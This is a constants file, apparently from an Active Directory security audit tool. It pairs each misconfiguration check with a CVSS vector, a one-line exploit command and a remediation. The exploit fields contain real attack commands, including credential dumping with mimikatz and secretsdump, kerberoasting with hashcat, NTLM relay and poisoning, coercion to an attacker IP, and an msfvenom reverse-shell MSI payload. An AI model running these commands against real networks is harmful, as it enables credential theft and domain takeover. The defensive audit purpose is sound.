# CVSS v3.1 base vector strings assigned to each check (module name).
# These represent the severity of a check when it is FAILED (color == 'red').
# The base score is COMPUTED from the vector (see modules/cvss.py), never hardcoded,
# so every score is fully justifiable by its vector.
#
# Vector metrics (CVSS v3.1 Base):
#   AV  Attack Vector        N=Network  A=Adjacent  L=Local  P=Physical
#   AC  Attack Complexity    L=Low      H=High
#   PR  Privileges Required  N=None     L=Low       H=High
#   UI  User Interaction     N=None     R=Required
#   S   Scope                U=Unchanged C=Changed
#   C   Confidentiality      H=High     L=Low       N=None
#   I   Integrity            H=High     L=Low       N=None
#   A   Availability         H=High     L=Low       N=None
#
# Severity bands: Critical 9.0-10.0 / High 7.0-8.9 / Medium 4.0-6.9 / Low 0.1-3.9 / None 0.0
CVSS_VECTORS = {
    # --- User Account Management ---
    "blank_password":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 9.8
    "reversible_password":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",  # 10.0
    "identical_password":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 8.1
    "password_not_required":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 9.1
    "asreproast":             "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 7.4
    "kerberoast":             "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",  # 6.8
    "timeroast":              "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",  # 5.9
    "des_authentication":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 6.5
    "admin_can_be_delegated": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 8.8
    "admin_not_protected":    "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",  # 6.8
    "native_admin_logon":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",  # 5.4
    "was_admin":              "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",  # 4.2
    "admins_schema":          "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N",  # 7.7
    "accounts_never_expire":  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",  # 4.8
    "auth_attributes":        "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",  # 5.9
    "pre2000_group":          "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",  # 6.5
    "inactive_accounts":      "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 3.7
    "locked_accounts":        "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",  # 3.7

    # --- Privilege and Trust Management ---
    "trusted_for_delegation": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",  # 10.0
    "rbcd":                   "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 8.8
    "constrained_delegation": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 7.5
    "can_update_dns":         "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",  # 5.9
    "share_ace":              "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",  # 6.5

    # --- Computer and Domain Management ---
    "krbtgt_password_age":    "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N",  # 7.7
    "ldap_signing":           "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 8.1
    "smb_signing":            "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 8.1
    "channel_binding":        "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 7.1
    "ldap_anonymous":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",  # 7.5
    "can_add_computer":       "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",  # 5.9
    "laps":                   "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N",  # 8.2
    "recycle_bin":            "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L",  # 2.2
    "dfsr":                   "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",  # 4.2
    "spooler":                "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 8.8
    "wmi_last_update":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 8.2
    "wmi_last_backup":        "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",  # 2.5

    # --- Audit and Policy Management ---
    "gpp_password":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 9.8
    "reg_autologin":          "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",  # 8.1
    "reg_AlwaysInstallElevated": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 7.8
    "reg_LMHASH":             "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 8.1
    "reg_wdigest":            "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N",  # 6.0
    "reg_NTLMv2":             "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 6.8
    "reg_lsass_ppl":          "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",  # 4.4
    "reg_CredentialGuard":    "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",  # 4.4
    "reg_lsa_cache":          "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",  # 4.4
    "reg_uac":                "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # 7.8
    "reg_rdp_nla":            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 7.4
    "reg_rdp_nopth":          "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",  # 8.1
    "reg_llmnr":              "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 7.1
    "reg_wpad":               "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 7.1
    "reg_ipv4_only":          "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",  # 5.9
    "reg_applocker":          "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",  # 6.1
    "reg_pwsh2":              "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",  # 6.1
    "reg_pwsh_restricted":    "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",  # 3.3
    "reg_pwsh_event":         "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N",  # 2.5
    "reg_bitlocker":          "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",  # 4.6
    "reg_fw":                 "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",  # 6.3
    "reg_wsh":                "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",  # 3.9
    "reg_wsus_config":        "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",  # 8.0
    "reg_rdp_timeout":        "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",  # 3.5
    "reg_ca":                 "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",  # 6.8
    "audit_policy":           "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",  # 3.6
    "force_logoff":           "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",  # 3.1
}

# Default CVSS vector for a failed check that is not explicitly listed above.
DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"  # 4.2

CHECK_METADATA = {
    # --- User Account Management ---
    "blank_password": {
        "exploit": 'mimikatz.exe "privilege::debug" "lsadump::sam" exit > sam.txt',
        "fix": "Set a strong password on every account and enforce a password policy (length, complexity, history). Disable or remove accounts that must not authenticate.",
    },
    "reversible_password": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Disable 'Store passwords using reversible encryption' in the Default Domain Policy and on the affected accounts, then force a password reset.",
    },
    "identical_password": {
        "exploit": "hashcat -a 0 -m 1000 hashes.txt dict.txt",
        "fix": "Reset the duplicated passwords with unique, strong values. Investigate shared/service accounts and rotate their secrets.",
    },
    "password_not_required": {
        "exploit": 'nxc smb dc_ip -u "user" -p "" --shares',
        "fix": "Remove the PASSWD_NOTREQD flag (userAccountControl) and require a password on these accounts.",
    },
    "asreproast": {
        "exploit": 'nxc ldap dc_ip -u "user" -p "password" --asreproast hashes.txt && hashcat -a 0 -m 18200 hashes.txt dict.txt',
        "fix": "Enable Kerberos pre-authentication on every account (uncheck 'Do not require Kerberos preauthentication').",
    },
    "kerberoast": {
        "exploit": 'nxc ldap dc_ip -u "user" -p "password" --kerberoast hashes.txt && hashcat -a 0 -m 13100 hashes.txt dict.txt',
        "fix": "Use long random passwords (25+ chars) or gMSA for service accounts with SPNs, and enforce AES encryption.",
    },
    "timeroast": {
        "exploit": 'nxc smb dc_ip -u "user" -p "password" -M timeroast',
        "fix": "Restrict NTP authentication and set strong machine/trust account passwords; monitor SNTP requests.",
    },
    "des_authentication": {
        "exploit": 'nxc ldap dc_ip -u "user" -p "password" --kerberoast hashes.txt && hashcat -a 0 -m 7500 hashes.txt dict.txt',
        "fix": "Disable 'Use Kerberos DES encryption types' on all accounts and enforce AES.",
    },
    "admin_can_be_delegated": {
        "exploit": "Abuse delegation to impersonate the privileged account (see thehacker.recipes Kerberos delegations).",
        "fix": "Set 'Account is sensitive and cannot be delegated' on all privileged accounts, or add them to the Protected Users group.",
    },
    "admin_not_protected": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Add privileged accounts to the 'Protected Users' security group to harden their credentials.",
    },
    "native_admin_logon": {
        "exploit": "bash seth.sh eth0 <ATTACKER IP> <ADMIN IP> <DC IP>",
        "fix": "Stop using the built-in Administrator (RID 500) for daily operations; use named admin accounts and monitor its usage.",
    },
    "was_admin": {
        "exploit": 'nxc smb dc_ip -u "user" -p "password" --sam',
        "fix": "Review accounts that held admin rights, confirm least-privilege, and rotate their credentials.",
    },
    "admins_schema": {
        "exploit": "https://www.thehacker.recipes/ad/movement/builtins/security-groups",
        "fix": "Keep 'Schema Admins' empty except during schema changes; add members only temporarily.",
    },
    "accounts_never_expire": {
        "exploit": "https://www.netexec.wiki/smb-protocol/password-spraying",
        "fix": "Enforce password expiration; only allow non-expiring passwords for justified service accounts using gMSA.",
    },
    "auth_attributes": {
        "exploit": 'bloodyad -u "user" -p "password" --host dc_ip -d domain get object "account" --attr altSecurityIdentities',
        "fix": "Audit altSecurityIdentities mappings; remove unexpected certificate/explicit mappings (CVE-2022-34691 / certificate abuse).",
    },
    "pre2000_group": {
        "exploit": 'nxc smb dc_ip -u "user" -p "password" --users',
        "fix": "Remove unnecessary members from 'Pre-Windows 2000 Compatible Access'; it grants broad read access.",
    },
    "inactive_accounts": {
        "exploit": "https://www.netexec.wiki/smb-protocol/password-spraying",
        "fix": "Disable or delete stale accounts; implement a lifecycle process for joiners/movers/leavers.",
    },
    "locked_accounts": {
        "exploit": "Review lockout source (possible password spraying).",
        "fix": "Investigate lockout cause, unlock legitimate accounts, and monitor for spraying.",
    },

    # --- Privilege and Trust Management ---
    "trusted_for_delegation": {
        "exploit": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained",
        "fix": "Remove unconstrained delegation. Use constrained or resource-based delegation, and protect privileged accounts.",
    },
    "rbcd": {
        "exploit": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",
        "fix": "Audit msDS-AllowedToActOnBehalfOfOtherIdentity; remove attacker-controllable RBCD entries and restrict write access on computer objects.",
    },
    "constrained_delegation": {
        "exploit": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained",
        "fix": "Review constrained delegation targets; prefer RBCD and disable protocol transition where not needed.",
    },
    "can_update_dns": {
        "exploit": 'python3 dnstool.py -u "domain\\user" -p "password" --record "fakehost" --action add --data ip dc_ip',
        "fix": "Restrict DNS record creation to trusted accounts; disable insecure dynamic updates on AD zones.",
    },
    "share_ace": {
        "exploit": 'python3 manspider ip -f "words" -d domain -u "user" -p "password"',
        "fix": "Review SMB share ACLs; remove world/authenticated-users write or read on sensitive shares.",
    },

    # --- Computer and Domain Management ---
    "krbtgt_password_age": {
        "exploit": "impacket-ticketer (golden ticket) once krbtgt hash is known.",
        "fix": "Rotate the krbtgt password twice (with a delay) regularly and after any DC compromise.",
    },
    "ldap_signing": {
        "exploit": "impacket-ntlmrelayx -t ldap://dc_ip --escalate-user user",
        "fix": "Require LDAP signing on all DCs (Domain controller: LDAP server signing requirements = Require signing).",
    },
    "smb_signing": {
        "exploit": "impacket-ntlmrelayx -tf ip -smb2support",
        "fix": "Enforce SMB signing (require) on servers and clients via GPO to prevent relay.",
    },
    "channel_binding": {
        "exploit": "impacket-ntlmrelayx -t ldap://dc_ip --escalate-user user",
        "fix": "Enable LDAP channel binding (EPA) on DCs to block cross-protocol relay to LDAPS.",
    },
    "ldap_anonymous": {
        "exploit": "ldapdomaindump --no-grep --no-json dc_ip",
        "fix": "Disable anonymous LDAP binds; remove ANONYMOUS LOGON read rights from the directory.",
    },
    "can_add_computer": {
        "exploit": 'impacket-addcomputer -computer-name "fakehost$" -computer-pass "password" "domain/user:password" -dc-ip dc_ip',
        "fix": "Set ms-DS-MachineAccountQuota to 0 and delegate machine-join to a dedicated group.",
    },
    "laps": {
        "exploit": 'nxc smb ip -u user -p password --laps',
        "fix": "Deploy LAPS / Windows LAPS to randomize local admin passwords and restrict read access to admins only.",
    },
    "recycle_bin": {
        "exploit": "N/A",
        "fix": "Enable the AD Recycle Bin to allow recovery of deleted objects.",
    },
    "dfsr": {
        "exploit": "N/A",
        "fix": "Migrate SYSVOL replication from FRS to DFSR if not already done.",
    },
    "spooler": {
        "exploit": "coercer coerce --always-continue -u user -p password -l attacker_ip -t dc_ip",
        "fix": "Disable the Print Spooler service on Domain Controllers and servers that don't need it (PrintNightmare / coercion).",
    },
    "wmi_last_update": {
        "exploit": "python3 wes.py systeminfo.txt -cde",
        "fix": "Apply latest OS security updates; enforce a patch-management cadence.",
    },
    "wmi_last_backup": {
        "exploit": "N/A",
        "fix": "Ensure regular, tested backups of Domain Controllers and system state.",
    },

    # --- Audit and Policy Management ---
    "gpp_password": {
        "exploit": 'nxc smb dc_ip -u "user" -p "password" -M gpp_password',
        "fix": "Remove cpassword from Group Policy Preferences and rotate any exposed credentials (MS14-025).",
    },
    "reg_autologin": {
        "exploit": 'nxc smb ip -u "user" -p "password" -M gpp_autologin',
        "fix": "Disable AutoAdminLogon and remove DefaultPassword from the registry; rotate the credential.",
    },
    "reg_AlwaysInstallElevated": {
        "exploit": "/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f msi -o payload.msi",
        "fix": "Disable AlwaysInstallElevated in both HKLM and HKCU policies.",
    },
    "reg_LMHASH": {
        "exploit": 'nxc smb ip -u "user" -p "password" --sam',
        "fix": "Enable 'Network security: Do not store LAN Manager hash value on next password change' and force resets.",
    },
    "reg_wdigest": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Set UseLogonCredential=0 to prevent WDigest from caching plaintext credentials.",
    },
    "reg_NTLMv2": {
        "exploit": "responder -I eth0 -v --lm --disable-ess",
        "fix": "Set LmCompatibilityLevel to 5 (send NTLMv2 only, refuse LM & NTLM).",
    },
    "reg_lsass_ppl": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Run LSASS as a protected process (RunAsPPL=1) to hinder credential dumping.",
    },
    "reg_CredentialGuard": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Enable Windows Defender Credential Guard via GPO on supported hosts.",
    },
    "reg_lsa_cache": {
        "exploit": 'impacket-secretsdump "domain/user:password@ip"',
        "fix": "Reduce cached logon count (CachedLogonsCount) to a low value (e.g. 1-2).",
    },
    "reg_uac": {
        "exploit": 'nxc smb ip -u "user" -p "password" --local-auth --sam',
        "fix": "Harden UAC: enable admin approval mode, disable remote local-admin token (LocalAccountTokenFilterPolicy=0).",
    },
    "reg_rdp_nla": {
        "exploit": "bash seth.sh eth0 <ATTACKER IP> <ADMIN IP> <DC IP>",
        "fix": "Require Network Level Authentication (NLA) for RDP.",
    },
    "reg_rdp_nopth": {
        "exploit": "xfreerdp /u:user /pth:hash /v:ip /cert:ignore",
        "fix": "Enable Restricted Admin mode protections / disable PtH-friendly RDP configuration.",
    },
    "reg_llmnr": {
        "exploit": "responder -I eth0 -v",
        "fix": "Disable LLMNR, NetBIOS-NS and mDNS via GPO to prevent name-resolution poisoning.",
    },
    "reg_wpad": {
        "exploit": "responder -I eth0 -vw",
        "fix": "Disable WPAD auto-detection and create a WPAD DNS record pointing nowhere.",
    },
    "reg_ipv4_only": {
        "exploit": "mitm6 -i eth0 -d domain && responder -I eth0 -v",
        "fix": "Disable IPv6 if unused, or filter rogue RA/DHCPv6 to prevent mitm6.",
    },
    "reg_applocker": {
        "exploit": "Execute arbitrary binaries/scripts (no application allow-listing).",
        "fix": "Define and enforce AppLocker (or WDAC) rules in enforce mode.",
    },
    "reg_pwsh2": {
        "exploit": "powershell -version 2 (downgrade to bypass logging/AMSI).",
        "fix": "Remove the PowerShell v2 engine feature to prevent downgrade attacks.",
    },
    "reg_pwsh_restricted": {
        "exploit": "Run scripts via bypass execution policy.",
        "fix": "Set PowerShell execution policy and use Constrained Language Mode where appropriate.",
    },
    "reg_pwsh_event": {
        "exploit": "N/A",
        "fix": "Enable PowerShell ScriptBlock and Module logging plus transcription.",
    },
    "reg_bitlocker": {
        "exploit": "python ExtractBitlockerKeys.py -d domain -u user -p password --dc-ip dc_ip",
        "fix": "Enable BitLocker on system drives with TPM and store keys securely.",
    },
    "reg_fw": {
        "exploit": "Direct network access to host services (firewall off).",
        "fix": "Enable Windows Firewall on all profiles with appropriate inbound rules.",
    },
    "reg_wsh": {
        "exploit": "Execute .vbs/.js payloads via Windows Script Host.",
        "fix": "Disable Windows Script Host (Enabled=0) where not required.",
    },
    "reg_wsus_config": {
        "exploit": "wsuks -t ip --wsus-server wsus_ip",
        "fix": "Use HTTPS for WSUS and validate update signing to prevent update injection.",
    },
    "reg_rdp_timeout": {
        "exploit": "Hijack an orphaned RDP session.",
        "fix": "Configure short RDP idle/disconnect session timeouts via GPO.",
    },
    "reg_ca": {
        "exploit": "Trust abuse via rogue/disabled Root CA certificates.",
        "fix": "Audit Trusted Root CAs; remove untrusted/disabled issuers.",
    },
    "audit_policy": {
        "exploit": "N/A",
        "fix": "Configure an advanced audit policy covering logon, account management, and object access.",
    },
    "force_logoff": {
        "exploit": "Persist sessions beyond allowed logon hours.",
        "fix": "Enable 'Network security: Force logoff when logon hours expire'.",
    },
}

CHECKLIST = {
    "LOW PRIVILEGE MODULES": [
        {
            "User Account Management": [
                ("was_admin", "Accounts that had admin rights in the past"),
                ("timeroast", "Accounts vulnerable to timeroasting attack"),
                ("reversible_password", "Accounts which have reversible passwords"),
                ("pre2000_group", "Name of Pre-Windows 2000 Compatible Access group members"),
                ("password_not_required", "Accounts with password not required"),
                ("native_admin_logon", "Verify if The native administrator account has been used recently"),
                ("locked_accounts", "Locked accounts"),
                ("kerberoast", "Accounts vulnerable to KerbeRoasting attack"),
                ("inactive_accounts", "Number of inactive accounts"),
                ("des_authentication", "Accounts which can use DES authentication"),
                ("auth_attributes", "Accounts with altSecurityIdentities attributes"),
                ("", "Accounts with userPassword attributes"),
                ("", "Accounts with unixUserPassword attributes"),
                ("", "Accounts with unicodePwd attributes"),
                ("", "Accounts with msDS-HostServiceAccount attributes"),
                ("asreproast", "Accounts vulnerable to ASRepRoasting attack"),
                ("admins_schema", "Number of accounts in 'Schema Admins' group"),
                ("admin_not_protected", "Admin accounts not in 'Protected Users' group"),
                ("admin_can_be_delegated", "Admin accounts that can be delegated"),
                ("accounts_never_expire", "Number of accounts which have never expiring passwords"),
                ("privesc_group", "Get List of users in Privesc group", "INFO"),
                ("gMSA", "Get Group Managed Service Accounts", "INFO"),
                ("users_description", "Get Users with description", "INFO")
            ],
            "Audit and Policy Management": [
                ("get_policies", "Dowload Group Policy Objects"),
                ("gpp_password", "Name of Group Policy containing a password"),
                ("force_logoff", "Verify if Force logoff when logon hours expire"),
                ("password_policy", "Get Default password policy", "INFO"),
                ("gpo_by_ou", "Get Group Policy Object by Organizational Unit", "INFO")
            ],
            "Computer and Domain Management": [
                ("smb_signing", "Verify if SMB signing is required"),
                ("recycle_bin", "Verify if Recycle Bin is enabled"),
                ("ldap_signing", "Verify if LDAP signature was required on target"),
                ("channel_binding", "Verify if Channel binding is enforced"),
                ("krbtgt_password_age", "Verify if Kerberos password last changed < 40 days"),
                ("can_add_computer", "Verify if Non-admin users can add up to 10 computer(s) to a domain"),
                ("ldap_anonymous", "Verify LDAP anonymous binding"),
                ("supported_encryption", "Get Supported encryption by Domain Controllers", "INFO"),
                ("pso", "Get Password Settings Object", "INFO"),
                ("krbtgt_encryption", "Get Supported Kerberos encryption algorithms", "INFO"),
                ("kerberos_hardened", "Get Kerberos config", "INFO"),
                ("functional_level", "Get Functional level of domain", "INFO"),
                ("domain_controlers", "Get Domain Controllers", "INFO"),
                ("bitlocker", "Computers with bitlocker keys", "INFO"),
                ("dfsr", "Verify if DFSR SYSVOL is enabled"),
                ("namedpipes", "Get List of Named pipes", "INFO"),
                ("spooler", "Verify if Spooler service is enabled on remote target")
            ],
            "Privilege and Trust Management": [
                ("trusted_for_delegation", "Name of Trust accounts for the delegation"),
                ("rbcd", "Name of Computers with rbcd"),
                ("constrained_delegation", "Computers with constrained delegation"),
                ("can_update_dns", "Verify if User can create dns record"),
                ("silos", "Get Authentication policy silos", "INFO"),
                ("priv_rights", "Get Privilege Rights (SeDebugPrivilege, SeBackupPrivilege, ...)", "INFO"),
                ("policies_ace", "Get Group policy folder/file rights", "INFO"),
                ("trusts", "Get Trust Relationships, Trusting Direction, and Trust Transitivity", "INFO")
            ]
        }
    ],
    "\nHIGH PRIVILEGE MODULES (requires admin privs)": [
        {
            "User Account Management": [
                ("identical_password", "Number of accounts with identical passwords"),
                ("blank_password", "Accounts with blank password")
            ],
            "Audit and Policy Management": [
                ("audit_policy", "Get Audit Policy"),
                ("reg_uac", "Verify if UAC configuration is secure"),
                ("reg_AlwaysInstallElevated", "Verify if MSI packages are always installed with elevated privileges"),
                ("reg_CredentialGuard", "Verify if CredentialGuard is enabled"),
                ("reg_LMHASH", "Verify if LM hash storage disabled"),
                ("reg_NTLMv2", "Verify if Authentication limited to NTLMv2 mechanism only"),
                ("reg_applocker", "Verify if AppLocker rules defined"),
                ("reg_autologin", "Verify if gpp_autologon is enabled"),
                ("reg_av", "Get Name of AMSI installed", "INFO"),
                ("reg_bitlocker", "Verify if Bitlocker is enabled"),
                ("reg_fw", "Verify if Firewall is disabled"),
                ("reg_ipv4_only", "Verify if IPv4 preferred over IPv6"),
                ("reg_llmnr", "Verify if LLMNR, NetBIOS ou mDNS is enabled"),
                ("reg_lsa_cache", "Verify if Too many logons are kept in the LSA cache"),
                ("reg_lsass_ppl", "Verify if Lsass runs as a protected process"),
                ("reg_pwsh2", "Verify if Powershell v2 is enabled"),
                ("reg_pwsh_event", "Verify if Powershell events are logged"),
                ("reg_pwsh_restricted", "Verify if Powershell is configured in Restricted mode"),
                ("reg_rdp_nla", "Verify if RDP use NLA"),
                ("reg_rdp_nopth", "Verify if RDP is secured over pass the hash attack"),
                ("reg_rdp_timeout", "Verify if RDP session timeout is too short"),
                ("reg_wdigest", "Verify if WDigest authentication enabled"),
                ("reg_wpad", "Verify if WPAD is disabled"),
                ("reg_wsh", "Verify if Windows Script Host is disabled"),
                ("reg_wsus_config", "Verify if WSUS server is not used"),
                ("reg_ca", "Verify status of Trusted Root Certification Authorities")
            ],
            "Computer and Domain Management": [
                ("wmi_last_backup", "Verify if The computer was recently backed up"),
                ("wmi_last_update", "Verify if The computer is up to date"),
                ("laps", "Verify if LAPS is installed")
            ],
            "Privilege and Trust Management": [
                ("reg_ace", "Registry access rights", "INFO"),
                ("control_delegations", "Get Control delegations by container", "INFO"),
                ("reg_winrm", "Get WSManConfig", "INFO"),
                ("share_ace", "Get List SMB shares and their ACL ")
            ]
        },
    ]
}

# https://learn.microsoft.com/en-us/windows/win32/adschema/a-pwdproperties
PWD_PROPERTIES = {
    1: "DOMAIN_PASSWORD_COMPLEX",
    2: "DOMAIN_PASSWORD_NO_ANON_CHANGE",
    4: "DOMAIN_PASSWORD_NO_CLEAR_CHANGE",
    8: "DOMAIN_LOCKOUT_ADMINS",
    16: "DOMAIN_PASSWORD_STORE_CLEARTEXT",
    32: "DOMAIN_REFUSE_PASSWORD_CHANGE"
}

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/564dc969-6db3-49b3-891a-f2f8d0a68a7f
FOREST_LEVELS = {
    10: "Windows Server 2025",
    7: "Windows Server 2016",
    6: "Windows Server 2012 R2",
    5: "Windows Server 2012",
    4: "Windows Server 2008 R2",
    3: "Windows Server 2008",
    2: "Windows Server 2003",
    1: "Windows Server 2003 operating system through Windows Server 2016",
    0: "Windows 2000 Server operating system through Windows Server 2008 operating system"
}

# https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797
SUPPORTED_ENCRYPTION = {
    0: "RC4_HMAC_MD5",
    1: "DES_CBC_CRC",
    2: "DES_CBC_MD5",
    3: "DES_CBC_CRC, DES_CBC_MD5",
    4: "RC4",
    5: "DES_CBC_CRC, RC4",
    6: "DES_CBC_MD5, RC4",
    7: "DES_CBC_CRC, DES_CBC_MD5, RC4",
    8: "AES 128",
    9: "DES_CBC_CRC, AES 128",
    10: "DES_CBC_MD5, AES 128",
    11: "DES_CBC_CRC, DES_CBC_MD5, AES 128",
    12: "RC4, AES 128",
    13: "DES_CBC_CRC, RC4, AES 128",
    14: "DES_CBC_MD5, RC4, AES 128",
    15: "DES_CBC_CBC, DES_CBC_MD5, RC4, AES 128",
    16: "AES 256",
    17: "DES_CBC_CRC, AES 256",
    18: "DES_CBC_MD5, AES 256",
    19: "DES_CBC_CRC, DES_CBC_MD5, AES 256",
    20: "RC4, AES 256",
    21: "DES_CBC_CRC, RC4, AES 256",
    22: "DES_CBC_MD5, RC4, AES 256",
    23: "DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256",
    24: "AES 128, AES 256",
    25: "DES_CBC_CRC, AES 128, AES 256",
    26: "DES_CBC_MD5, AES 128, AES 256",
    27: "DES_CBC_MD5, DES_CBC_MD5, AES 128, AES 256",
    28: "RC4, AES 128, AES 256",
    29: "DES_CBC_CRC, RC4, AES 128, AES 256",
    30: "DES_CBC_MD5, RC4, AES 128, AES 256",
    31: "DES_CBC_CRC, DES_CBC_MD5, RC4-HMAC, AES128-CTS-HMAC-SHA1-96, AES256-CTS-HMAC-SHA1-96"
}

PRIVESC_GROUP = {
    "S-1-5-32-544": "Administrators",
    "domain-512": "Domain Admins",
    "domain-519": "Enterprise Admins",
    "domain-527": "Enterprise Key Admins",
    "domain-526": "Key Admins",
    "domain-518": "Schema Admins",
    "S-1-5-32-552": "Replicator",
    "S-1-5-32-549": "Server Operators",
    "S-1-5-32-551": "Backup Operators",
    "S-1-5-32-550": "Print Operators",
    "domain-1101": "DnsAdmins",
    "S-1-5-32-548": "Account Operators",
    "S-1-5-32-555": "Remote Desktop Users",
    "S-1-5-32-574": "Certificate Operators",
    "domain-517": "Cert Publishers",
}

TRUST_DIRECTIONS = {
    1: "Inbound",
    2: "Outbound",
    3: "Bidirectional",
}

TRUST_ATTRIBUTE_FLAGS = [
    (0x001, "Non-Transitive"),
    (0x002, "Uplevel-Only"),
    (0x004, "Quarantined Domain"),
    (0x008, "Forest Transitive"),
    (0x010, "Cross Organization"),
    (0x020, "Within Forest"),
    (0x040, "Treat as External"),
    (0x080, "Uses RC4 Encryption"),
    (0x100, "Cross Organization No TGT Delegation"),
    (0x2000, "PAM Trust"),
]

ANSI = {
    'reset':      '\033[0m',
    'black':      '\033[30m',
    'red':        '\033[31m',
    'green':      '\033[32m',
    'yellow':     '\033[33m',
    'magenta':    '\033[35m',
    'cyan':       '\033[36m',
    'white':      '\033[37m',
    'dim':        '\033[90m',
    'bold_red':   '\033[1;31m',
}

SEVERITY = {
